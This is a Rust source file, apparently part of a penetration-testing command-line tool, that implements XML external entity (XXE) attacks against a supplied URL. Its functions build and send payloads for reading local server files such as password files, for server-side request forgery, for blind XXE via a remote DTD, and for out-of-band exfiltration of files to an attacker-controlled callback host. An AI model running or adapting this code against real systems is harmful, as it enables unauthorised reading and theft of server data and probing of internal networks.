use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

pub async fn file_read(
    url: &str,
    token: Option<&str>,
    timeout: u64,
    file_path: &str,
) -> anyhow::Result<()> {
    println!("{} XXE File Read", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:  {}", "[*]".cyan().bold(), url);
    println!("{} File: {}", "[*]".cyan().bold(), file_path);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payload = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{}">
]>
<foo>&xxe;</foo>"#,
        file_path
    );

    println!("{} Sending XXE payload...", "[*]".cyan().bold());
    let resp = client
        .post(url)
        .header("Content-Type", "application/xml")
        .body(payload.clone())
        .send()
        .await?;

    let status = resp.status();
    let body = resp.text().await.unwrap_or_default();

    println!("{} Status: {}", "[*]".cyan().bold(), status);
    if body.len() > 100 {
        println!("{} [+] Response (first 500 chars):", "[+]".green().bold());
        println!("  {}", body.chars().take(500).collect::<String>());
    } else {
        println!("{} Response: {}", "[*]".cyan().bold(), body);
    }

    if body.contains("root:") || body.contains("[boot loader]") || body.contains("daemon:") {
        println!(
            "\n{} [CRITICAL] XXE file read confirmed!",
            "[!]".red().bold()
        );
    } else {
        println!(
            "\n{} Response may not contain file contents. Check manually.",
            "[-]".yellow().bold()
        );
    }
    Ok(())
}

pub async fn ssrf(
    url: &str,
    token: Option<&str>,
    timeout: u64,
    target_url: &str,
) -> anyhow::Result<()> {
    println!("{} XXE SSRF", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:     {}", "[*]".cyan().bold(), url);
    println!("{} Target:  {}", "[*]".cyan().bold(), target_url);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payload = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{}">
]>
<foo>&xxe;</foo>"#,
        target_url
    );

    let resp = client
        .post(url)
        .header("Content-Type", "application/xml")
        .body(payload)
        .send()
        .await?;

    let status = resp.status();
    let body = resp.text().await.unwrap_or_default();

    println!("{} Status: {}", "[*]".cyan().bold(), status);
    if !body.is_empty() {
        println!("{} [+] Response (first 500 chars):", "[+]".green().bold());
        println!("  {}", body.chars().take(500).collect::<String>());
    }
    Ok(())
}

pub async fn blind(
    url: &str,
    token: Option<&str>,
    timeout: u64,
    callback_host: &str,
) -> anyhow::Result<()> {
    println!("{} Blind XXE", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:      {}", "[*]".cyan().bold(), url);
    println!("{} Callback: {}", "[*]".cyan().bold(), callback_host);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payload = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{}/xxe.dtd">
  %xxe;
]>
<foo>test</foo>"#,
        callback_host
    );

    let _ = client
        .post(url)
        .header("Content-Type", "application/xml")
        .body(payload)
        .send()
        .await;

    println!(
        "{} Blind XXE payload sent. Monitor callback for DTD fetch.",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn oob(
    url: &str,
    token: Option<&str>,
    timeout: u64,
    callback_host: &str,
    file_path: &str,
) -> anyhow::Result<()> {
    println!("{} XXE OOB Exfiltration", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:      {}", "[*]".cyan().bold(), url);
    println!("{} Callback: {}", "[*]".cyan().bold(), callback_host);
    println!("{} File:     {}", "[*]".cyan().bold(), file_path);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payload = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file://{}">
  <!ENTITY % dtd SYSTEM "http://{}/exfil.dtd">
  %dtd;
]>
<foo>test</foo>"#,
        file_path, callback_host
    );

    let _ = client
        .post(url)
        .header("Content-Type", "application/xml")
        .body(payload)
        .send()
        .await;

    println!(
        "{} OOB payload sent. Set up a listener on {} to receive exfiltrated data.",
        "[*]".cyan().bold(),
        callback_host
    );
    Ok(())
}
